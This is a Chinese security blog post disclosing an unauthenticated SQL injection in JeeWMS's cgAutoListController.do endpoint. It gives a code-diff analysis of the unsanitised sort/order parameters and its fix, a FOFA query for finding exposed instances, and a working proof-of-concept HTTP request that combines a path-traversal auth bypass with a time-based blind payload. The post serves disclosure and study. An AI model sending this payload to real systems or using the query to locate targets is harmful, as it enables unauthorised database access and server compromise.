---
title: "JeeWMS cgAutoListController.do SQL注入漏洞"
source: https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html
asset_dir: assets/jeewms-cgautolistcontroller.do-sql注入漏洞
---

# JeeWMS cgAutoListController.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/25 08:28
* 1166浏览
* [0评论](#comment)
* 30分钟阅读

深入探索

数据库

鉴权

sql


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

JeeWMS 是基于Java全栈技术打造的智能仓储中枢系统，具备多形态仓储场景深度适配能力（兼容3PL第三方物流与厂内物流双模式）。JeeWMS cgAutoListController.do 接口处存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞，未经身份验证的恶意攻击者利用[SQL注入](https://mrxn.net/tag/SQL注入)漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

低于 20250422 版本

# fofa语法

> `body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"`

# 漏洞分析

深入探索

身份验证

SQL

软件

直接看 `src/main/java/org/jeecgframework/web/cgform/service/impl/autolist/CgTableServiceImpl.java` diff 修复前后差异

代码安全审计

[![JeeWMS cgAutoListController.do SQL注入漏洞](images/img-001-18d59dd548e3.webp)](https://image.mrxn.net/32ed6f87438240ebab0c348137abfef3.webp)

可以很明显看到修复之前的是直接将 `sort` 与 `order` 两个参数直接拼接到sql语句中

```
@Override
    public List<Map<String, Object>> querySingle(String table, String field, Map params,
                                                 String sort, String order, int page, int rows) {
        StringBuilder sqlB = new StringBuilder();
        dealQuerySql(table,field,params,sqlB);
        if(!StringUtil.isEmpty(sort)&& !StringUtil.isEmpty(order)){
            sqlB.append(" ORDER BY "+sort+" "+ order);
        }
        List<Map<String, Object>> result = commonService.findForJdbcParam(sqlB
                .toString(), page, rows);
        return result;
    }
```

深入探索

服务器

编码转换工具

技术文章订阅

造成[sql注入漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，而修复后的增加了`sanitizeSort` 方法对传入的 `sort` 使用正则进行检查，如果 `sort` 不满足正则 `[a-zA-Z0-9_]+` 则直接返回 `null` ，而 `sanitizeOrder` 方法则检查 `order` 只能是 `ASC` 或者 `DESC` ，避免了SQL注入。

漏洞修复方案

而 此方法的使用有三处地点，如下图所示

[![JeeWMS cgAutoListController.do SQL注入漏洞](images/img-002-e838be7e5e38.webp)](https://image.mrxn.net/b91b5b5d46ac4a2f9b18cacd6d7275ca.webp)

其中最后的 ExcelTempletController 不存在 `sort` 与 `order` 的调用，为固定的 `null` ，只有 `src/main/java/org/jeecgframework/web/cgform/controller/autolist/CgAutoListController.java` 有如下调用

```
if(isTree && treeId !=null) {
            //防止下级数据太大，最大只取500条
            result=cgTableService.querySingle(table, field.toString(), params,sort,order, 1, 500);
        }else {
            result=cgTableService.querySingle(table, field.toString(), params,sort,order, p,r );
        }
```

因此根据 JeeWMS 框架的特点，访问URL也就是： `/jeewms/cgAutoListController.do` (注意 jeewms 不一定存在)，结合前面的[权限绕过分析文章](https://mrxn.net/jswz/JeeWMS-commonController-upload-rce.html)，也可以是 `/jeewms/rest/../cgAutoListController.do`

# 漏洞复现

```
POST /jeewms/rest/../cgAutoListController.do?datagrid&configId=ba_del_mode&field=id,create_name,create_by,create_date,update_name,update_by,update_date,sys_org_code,sys_company_code,del_mode_code,del_mode_name, HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 160
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:8081
Referer: http://localhost:8081/jeewms/cgAutoListController.do?list&id=ba_del_mode&clickFunctionId=8a7ba3345d93bb87015d95e0118500af
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

del_mode_code=&order=desc%2C%28select%2Afrom%28select%2Bsleep%285%29union%2F%2A%2A%2Fselect%2B1%29a%29&page=1&rows=10&searchfield=del_mode_code&sort=create_date
```

[![JeeWMS cgAutoListController.do SQL注入漏洞](images/img-003-945af2a342cc.webp)](https://image.mrxn.net/d40d6b91ec7a4a25a920dd519743f22b.webp)

成功延时 5 秒

网络安全

# 参考

* `https://gitee.com/erzhongxmu/JEEWMS/issues/IC2IV4`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[JeeWMS cgAutoListController.do SQL注入漏洞](https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html)  
文章链接：<https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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